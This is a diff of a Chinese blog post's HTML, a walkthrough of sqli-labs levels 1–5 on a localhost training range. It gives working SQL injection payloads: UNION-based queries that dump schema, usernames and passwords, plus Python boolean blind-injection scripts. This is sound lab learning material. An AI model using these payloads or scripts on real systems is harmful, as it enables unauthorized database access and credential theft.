@@ -27,20 +27,39 @@
 <meta property="og:site_name" content="M21in的博客">
 <meta property="og:description" content="理论SQL 注入（SQL Injection）是一种常见的 Web 安全漏洞，其核心原理是：攻击者通过在用户输入的参数中插入恶意 SQL 代码，破坏原有 SQL 查询的结构，使数据库执行非预期的操作（如查询敏感数据、修改数据甚至删除数据库等）。 简单来说，就是后台程序没有对用户输入进行严格过滤，直接将用户输入拼接到 SQL 语句中执行，导致攻击者可以控制最终执行的 SQL 代码。 实操">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_1.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_2.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_3.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_4.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_5.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_6.png">
-<meta property="og:image" content="http://m21in.github.io/images/sqli/sqli1_7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260114181700040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260114181920614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260114182326091.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115002317380.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115003822754.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115004642870.png">
+<meta property="og:image" content="http://m21in.github.io/C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20260115004939728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115005418100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260114181455926.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115005658932.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115010134538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115010323058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115010422198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115010953389.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115011058329.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115011223938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115011407243.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115011626782.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260115011733695.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116002414903.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116003530434.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116004120632.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116005331210.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116010443972.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116010616730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260116012011614.png">
 <meta property="article:published_time" content="2025-09-14T12:17:11.000Z">
-<meta property="article:modified_time" content="2025-12-26T12:37:56.165Z">
+<meta property="article:modified_time" content="2026-01-16T17:54:46.220Z">
 <meta property="article:author" content="M21in">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://m21in.github.io/images/sqli/sqli1_1.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/m21in/picgo/main/20260114181700040.png">
 
 <link rel="canonical" href="http://m21in.github.io/4e38c875.html">
 
@@ -141,7 +160,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">29</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">36</span></a>
 
   </li>
   </ul>
@@ -202,7 +221,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-26 20:37:56" itemprop="dateModified" datetime="2025-12-26T20:37:56+08:00">2025-12-26</time>
+                <time title="修改时间：2026-01-17 01:54:46" itemprop="dateModified" datetime="2026-01-17T01:54:46+08:00">2026-01-17</time>
               </span>
 
           
@@ -228,35 +247,116 @@
 <h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><p>举例一个SQL查询语句</p>
 <p><code>SELECT * FROM users WHERE username = &#39;admin&#39; OR &#39;1&#39;=&#39;1&#39; AND password = &#39;用户输入的密码&#39;;</code></p>
 <p>SQL注入往服务器传参就是从WHERE开始，以username为参数，像这里username为<code>&#39;admin&#39; or &#39;1&#39;=&#39;1&#39;</code>，永真条件，会返回所有用户数据</p>
-<h2 id="sqli-labs1"><a href="#sqli-labs1" class="headerlink" title="sqli-labs1"></a>sqli-labs1</h2><p><img src="/./images/sqli/sqli1_1.png"></p>
+<h2 id="sqli-labs1"><a href="#sqli-labs1" class="headerlink" title="sqli-labs1"></a>sqli-labs1</h2><p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260114181700040.png" alt="image-20260114181659979"></p>
 <p>1’ 报错，说明是字符型注入</p>
+<p>原语句猜测是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27;          #这里多一个&#x27;</span>，导致语法错误，所以他一定是字符型</span><br></pre></td></tr></table></figure>
+
 <p>接下来爆列数</p>
 <p>用order by确定列数</p>
 <p>order by 4 时报错，说明有三列</p>
-<p><img src="/./images/sqli/sqli1_2.png"></p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260114181920614.png" alt="image-20260114181920562"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure>
+
+
+
 <p>使用联合查询union查询版本号</p>
 <p>这里有个细节，得换成-1，id&#x3D;-1本身是一个永假值，所以不会显示结果，只会显示union查询后的结果</p>
-<p><img src="/./images/sqli/sqli1_3.png"></p>
-<p><img src="/./images/sqli/sqli1_4.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,version() --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260114182326091.png" alt="image-20260114182326032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115002317380.png" alt="image-20260115002317313"></p>
 <p>成功查询到版本号，这里用#也可以，但是#必须进行一次url编码，直接#会报错</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,version()%23  %23是#url编码后</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./images/sqli/sqli1_5.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,database(),version()%23</span><br></pre></td></tr></table></figure>
-
-<p>同时查询到了数据库名(security)和版本号(我这里是5.0.96-community)</p>
-<p>这里好奇试了一下union select 1,2,3会返回什么</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./images/sqli/sqli1_6.png"></p>
-<p>只返回了数字2和3，返回的是name和password，id不返回，只记录后两个，所以payload只在后两列里写就行</p>
-<p>接下来就是爆表，前文order by确定了表有三列，union查询时也要保证前后都是三列</p>
+<p>同时查询到了数据库名 security 和版本号 5.5.29，然后接下来根据库名查表名</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115003822754.png" alt="image-20260115003822631"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
 
-<p>从名为<strong>security</strong>的数据库中查找表名为<strong>tables</strong>的<strong>table_name</strong>字段的所有列信息</p>
-<p><img src="/./images/sqli/sqli1_7.png"></p>
+<p>group_concat可以显示所有表名，如果直接使用table_name，就只会显示第一个表，然后直接锁定users表，套payload，把tables换成columns，把table_shema换成table_name</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115004642870.png" alt="image-20260115004642797"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>这里能看到username和password两个字段，然后对其进行注入</p>
+<p>得到了很敏感的信息</p>
+<p><img src="/C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20260115004939728.png" alt="image-20260115004939728"></p>
+<h2 id="sqli-labs2"><a href="#sqli-labs2" class="headerlink" title="sqli-labs2"></a>sqli-labs2</h2><p>看报错判断是数字型注入，这里的报错是无法显示数据，说明是语法错误，多了个’</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115005418100.png" alt="image-20260115005418020"></p>
+<p>因为order by4的时候报错，确定列数是3</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260114181455926.png" alt="image-20260114181455862"></p>
+<p>因为id为数字型再输入1就会多占用一行，所以这里把id设置成-1或者0，避免占位，直接显示union后的注入结果</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115005658932.png" alt="image-20260115005658830"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>然后查表名</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115010134538.png" alt="image-20260115010134417"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>查列名</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115010323058.png" alt="image-20260115010322956"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>查字段</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115010422198.png" alt="image-20260115010422061"></p>
+<h2 id="sql-labs3"><a href="#sql-labs3" class="headerlink" title="sql-labs3"></a>sql-labs3</h2><p>输入id&#x3D;1’，报错了一个括号，没闭合，但能判断是字符型注入</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115010953389.png" alt="image-20260115010953280"></p>
+<p>那就多加个右括号，后面注释掉</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115011058329.png" alt="image-20260115011058235"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>然后继续套数据库</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115011223938.png" alt="image-20260115011223843"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115011407243.png" alt="image-20260115011407150"></p>
+<p>后面还是一样，前面多加个)就好了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>查列</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115011626782.png" alt="image-20260115011626685"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>查字段</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260115011733695.png" alt="image-20260115011733592"></p>
+<h2 id="sql-labs4"><a href="#sql-labs4" class="headerlink" title="sql-labs4"></a>sql-labs4</h2><p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116002414903.png" alt="image-20260116002414789"></p>
+<p>试了一下发现是”)闭合，在输入1和1’测试时均正常回显，此时判断sql语句是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>&quot;1&#x27;&quot; 这里因为是单独的单引号，<span class="keyword">sql</span>会判断他是一个字符串常量，自动停止转换，所以能够正常显示id为<span class="number">1</span>的结果</span><br></pre></td></tr></table></figure>
+
+<p>然后多一个”就可以引起语法报错并且爆出语法错误点</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116003530434.png"></p>
+<p>看到右边还有括号错误，所以传参时还要闭合右侧的括号，sql语句变成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>(&quot;id=1&quot;&quot;) limit 0,1) --+</span><br></pre></td></tr></table></figure>
+
+<p>那就多加一个括号，再闭合右侧的语句，看到查询成功</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116004120632.png" alt="image-20260116004120537"></p>
+<p>后序就是公式化，查表名，不一一演示了，跟前几题一样，只是前面改了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+  //查表</span><br><span class="line">id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+  //查字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,group_concat(id,username,password) from users --+ //查字段</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sql-labs5"><a href="#sql-labs5" class="headerlink" title="sql-labs5"></a>sql-labs5</h2><p>这关没了报错语法提示，要用到盲注了</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116005331210.png" alt="image-20260116005331099"></p>
+<p>然后试数据库长度</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116010443972.png" alt="image-20260116010443887"></p>
+<p>这里错了，所以没有显示结果，但因为这里是靶场，数据库名是固定的<code>security</code>，直接改长度为8</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select database()))=8 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>但是盲注一般是要写脚本的，手搓进行盲注非常耗时间耗力气，自己脚本能力不是很好，将就着写，用python判断</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://localhost/sqli/Less-5/?id=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    payload=<span class="string">&quot;1&#x27; and length((select database()))=&quot;</span>+<span class="built_in">str</span>(char)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    res=requests.get(url.<span class="built_in">format</span>(payload))</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Length of database name is:&quot;</span>,char)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116010616730.png" alt="image-20260116010616647"></p>
+<p>可以看到给了个回显结果，<code>You are in .......</code>，提示盲注结果是对的</p>
+<p>然后继续猜测，这里知道数据库名，所以直接设置的115</p>
+<p><img src="https://raw.githubusercontent.com/m21in/picgo/main/20260116012011614.png" alt="image-20260116012011513"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),1,1))=115 --+ //从数据库的第一个字符开始判断，ASCII表第115个字符是s，对应security的第一个字母</span></span><br></pre></td></tr></table></figure>
+
+<p>盲注脚本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url<span class="operator">=</span>&quot;http://localhost/sqli/Less-5/?id=&#123;&#125;&quot;</span><br><span class="line">charset<span class="operator">=</span>&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line"></span><br><span class="line">def db_length():</span><br><span class="line">    <span class="keyword">for</span> <span class="type">char</span> <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        payload<span class="operator">=</span>&quot;1&#x27; and length((select database()))=&quot;<span class="operator">+</span>str(<span class="type">char</span>)<span class="operator">+</span>&quot;--+&quot;</span><br><span class="line">        res<span class="operator">=</span>requests.get(url.format(payload))</span><br><span class="line">        print(url.format(payload))</span><br><span class="line">        if(&quot;You are in...........&quot; <span class="keyword">in</span> res.text):</span><br><span class="line">            print(res.text)</span><br><span class="line">            print(&quot;Length of database name is:&quot;,<span class="type">char</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">char</span></span><br><span class="line"></span><br><span class="line">def db_name():</span><br><span class="line">    name<span class="operator">=</span>&quot;&quot;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,db_length()<span class="operator">+</span><span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            payload<span class="operator">=</span>f&quot;1&#x27; and ascii(substr((select database()),&#123;i&#125;,1))=&#123;ord(j)&#125; --+&quot;</span><br><span class="line">            res<span class="operator">=</span>requests.get(url.format(payload))</span><br><span class="line">            if(&quot;You are in...........&quot; <span class="keyword">in</span> res.text):</span><br><span class="line">                print(res.text)</span><br><span class="line">                name <span class="operator">+</span><span class="operator">=</span>j</span><br><span class="line">                print(f&quot;第&#123;i&#125;位匹配成功，是&#123;j&#125;&quot;)</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    db_long<span class="operator">=</span>db_length()</span><br><span class="line">    db_name<span class="operator">=</span>db_name()</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -342,7 +442,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%90%86%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">理论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">2.</span> <span class="nav-text">实操</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-labs1"><span class="nav-number">2.1.</span> <span class="nav-text">sqli-labs1</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%90%86%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">理论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">2.</span> <span class="nav-text">实操</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-labs1"><span class="nav-number">2.1.</span> <span class="nav-text">sqli-labs1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-labs2"><span class="nav-number">2.2.</span> <span class="nav-text">sqli-labs2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-labs3"><span class="nav-number">2.3.</span> <span class="nav-text">sql-labs3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-labs4"><span class="nav-number">2.4.</span> <span class="nav-text">sql-labs4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-labs5"><span class="nav-number">2.5.</span> <span class="nav-text">sql-labs5</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -358,7 +458,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
